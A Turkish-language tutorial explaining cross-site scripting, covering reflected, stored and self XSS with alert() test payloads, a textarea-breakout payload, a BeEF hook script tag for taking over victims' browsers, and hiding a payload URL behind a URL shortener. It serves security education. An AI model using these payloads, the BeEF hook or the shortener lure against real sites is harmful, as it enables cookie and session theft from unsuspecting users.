# **0x08 | XSS hakkında herşey part 1**

## **XSS nedir?**

Açılımı cross site scripting'tir ve siteler arası betik çalıştırma olarak çevrilebilir. Xss, bir çeşit js enjeksiyonu gibi düşünülebilir. Bir web uygulamasının frontend 
kısmına yönelik bir saldırıdır.

## **XSS nerede bulunur?**

Browsera dönen response'un içeriğinde html, css ve js bulunur. Bir siber güvenlikçi perspektifiyle bakacak olursak bizim için js her zaman daha önemlidir. Çünkü js 
uygulamanın hareket kabiliyetini belirler. XSS, %99 ihtimalle browsera dönen response'un body'sinde bulunur. 

<img width="1153" height="581" alt="image" src="https://github.com/user-attachments/assets/06e5ce8c-241f-4345-b66c-14ce0efbed57" />

Arama kısmında "mehmet" şeklinde arama yapıldığında sayfada input görülebilmektedir. 

<img width="474" height="60" alt="image" src="https://github.com/user-attachments/assets/379af923-fee4-483c-a367-ac33d679c1bf" />

Sayfanın html'i incelendiğinde de aynı şekilde görülebilmektedir.

<img width="400" height="46" alt="image" src="https://github.com/user-attachments/assets/be6e3446-0980-4420-bf05-561b748b7e65" />

Browserdan web sunucusuna bir post reqesti gider ve requestte bulunan query string ya da post parametreleri ile arama kısmına yazılan içerik sunucuya ulaşır. Kullanıcının kontrol edebildiği bu mekanizma xss açığı barındırabilir. 

## **DOM(Document Object Model) Mimarisi**

Bir web sitesinde sayfayı incele kısmına tıklanıp görülen içerik ile sayfanın kaynak kodu arasında fark vardır. Çünkü sayfanın kaynak kodundaki içerik browser tarafından yorumlanmıştır. Kaynak kod kısmındaki js kodları browser'ın interpreter'ı tarafından çalıştırılmıştır ve bu js kodları DOM'un üstündeki hareketleri değiştirir. Http response'un içerisindeki html içerik, browser için bir inputtur ve bir hacker'ın amacı bu input'un içinde ufak manipülasyonlar yapmaktır. 

Site içerisinde bir arama kutusuna isim yazdınız ve url'de bu hale geldi.

```
www.x.com/?keyword=mehmet
```

Kaynak kodu ise bu hale.

```
<div id="content">
 <h2 id='pageName'>searched for: mehmet</h2>
</div>
```

Eğer biz isim yazdığımız yere bu şekilde bir js kodu yazarsak yazılımcının istemediği bir şey yapmış oluruz.

```
www.x.com/?keyword=<script>alert()</script>
```

Koda da bu şekilde yansır.

```
<div id="content">
 <h2 id='pageName'>searched for: <script>alert()</script></h2>
</div>
```

Browser, <script>alert()</script> kısmını çalıştırmaması gerektiğini anlayamaz ve js kodunu çalıştırır. İşte xss'in başladığı nokta burasıdır. 

## **Verilerin farklı ortamlardaki durumu**

Web uygulamasına girilen data, php interpreterında bir data olsa da browsera response olarak geri döndüğünde data artık tag olur ve bu xss'i doğurur. 

<img width="434" height="201" alt="image" src="https://github.com/user-attachments/assets/dcc0a012-53ac-40f8-9cc3-a2195f906f78" />

Neden sürekli <script>alert()</script> denendiği sebebine gelirsek. Bu, pop-up çalıştırmamızı ve zafiyetin tespit edilmesini sağlar. İşin sömürü kısmına gelecek olursak frontend kısmının bozulması, cookilerin ve sessionların çalınması gibi şeylere yol açar xss.

## **BEEF XSS exploitation framework**

BeEF, profesyonel penetrasyon test cihazının istemci taraflı saldırı vektörlerini kullanarak gerçek bir hedef güvenlik ortamını değerlendirebilmesini sağlayan bir framework'tür.

Beef'i çalıştırdıktan sonra terminalde çıkan 2 ip.

```
[*]  Web UI: http://127.0.0.1:3000/ui/panel
[*]  Hook: <script src="http://127.0.0.1:3000/hook.js"></script>
```

"<script>alert()</script>" ile xss'in tespit edildiği yerde "<script src="http://127.0.0.1:3000/hook.js"></script>" çalıştırıyoruz ve beef panelinde online browsers kısmında siteyi görüyoruz. Burdan sonra command kısmında gelip cookielerin çalınmasından sosyal mühendislik saldırılarına kadar pek çok şey yapılabilir.

## **Reflected XSS**

Şimdiye kadar anlatılan xss aslında reflected xss idi. Türkçesi yansıyan xss anlamına gelen bu zafiyet türü, requesti gönderen bir kişinin browser'ında gerçekleşir. Birçok kullanıcının request-response cycle'ı vardır ve bunlar birbirinden bağımsızdır. Bu yüzden de bir saldırgan reflected xss bulduğu zaman bu başka kullanıcılar tarafından görülmez. 

Url shortener sitesine aşağıdaki url'i verildiğinde

```
http://boylebirsiteyok/?keyword=<script>alert(1)</script>
```

böyle bir url'e dönüştürecektir.

```
https://shorturl.at/mh965
```

Bu url'e tıklayan bir kullanıcı, hedef websitesine gider ve giderken browser tüm cookieleri ekler.

## **Stored XSS**

Reflected xss'in web app'ten gelen response'ta olduğundan bahsetmiştik. Şimdi bundan daha kötü bir senaryodan bahsedeceğiz. Payload'ın db'e kaydedildiği durum yani stored xss. Hatta bu db'den faydalanan başka web servisleri ve app'ler bile bu durumdan etkilenebilir. Stored xss kalıcı olarak sitede bulunur ve başka kullanıcılar da bundan etkilenir. Örneğin bir forum sayfasında bir saldırgan yorum olarak xss payload'ı ekledi. Yorumu gören bütün site kullanıcıları bu xss saldırısına maruz kalır. 

## **Self XSS**

Bir banka uygulamasına adres bilgileri girildiğinde kod kısmında böyle gözüktüğünü varsayalım.

```
<html>
 <header></header>
 <body>
  <textarea>
   adres bilgileri...
  </textarea>
 </body>
</html>
```

Adres yerine xss payloadı yazıldığında text'e dönüşecektir bu yüzden payload'ı yazarken <textarea> tag'i kapatılmalı. 

```
 <body>
  <textarea>
   </textarea><script>alert(1)</script>
  </textarea>
 </body>
```

Bu uygulamada kullanıcının kendisinden başka kimse adresini göremez. Dolayısıyla xss'i de kimse göremez yani bu bir self xss zafiyetidir. Self xss zafiyetini sömürmek için sosyal mühendislik gerekir.
